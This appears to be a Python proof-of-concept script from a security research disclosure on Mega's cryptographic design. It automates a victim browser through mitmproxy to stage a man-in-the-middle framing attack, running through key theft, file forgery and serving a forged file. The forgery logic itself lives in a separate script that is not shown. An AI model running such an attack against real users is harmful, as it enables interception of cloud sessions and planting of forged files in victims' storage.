
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC for MitM framing attack using mitmproxy and a victim automated
# with a Selenium browser.
#

from time import sleep
from os.path import basename

from shared.constants.victim import *
from shared.constants.mitmproxy import *
from shared.victim import *
from shared.mitmproxy import *

class PoCMitmFramingAttack:
    def __init__(self):
        print("# Initialize MitM Framing Attack PoC")

    def run_attack(self):
        forged_fname = basename(FORGE_FILE_NAME)

        print("## Starting MitM attack")

        print("### Starting the victim process")
        victim = Victim(VICTIM_UNAME, mitmproxy_addr=None)

        print("### Showing the cloud storage content before attack")
        victim.login()
        victim.wait_for_cloud()
        print(f"#### Note there is no file called {forged_fname}")

        # Give human time to see the file tree
        sleep(5)
        victim.logout(skip_recovery=True)

        print("### Starting mitmproxy")
        mitmproxy = Mitmproxy("issue_03/poc_mitmproxy.py")
        mitmproxy.start()
        victim.setup_driver(MITMPROXY_ADDR)

        print(f"### The attack is running, check '{MITMPROXY_LOG_FILE}' for intermediate results.")

        print("### [Step 1]: obtaining the node key")
        victim.login(unsuccessful=True)

        # happens in mitmproxy
        print("### [Step 2]: forging a file")
        victim.login()

        # happens in mitmproxy during login
        print("### [Step 3]: modifying the file tree")

        victim.wait_for_cloud()

        # Give humans time to see the new file
        sleep(2)

        victim.view_in_browser(forged_fname)

        # happens in mitmproxy after double clicking forged file
        print("### [Step 4]: Serving the forged file")

        # Give human time to see the forged file
        sleep(5)

        if mitmproxy.wait() and mitmproxy.is_done():
            print("### Attack successful!")
        else:
            print("### Attack failed!")

        mitmproxy.exit()
        victim.exit()
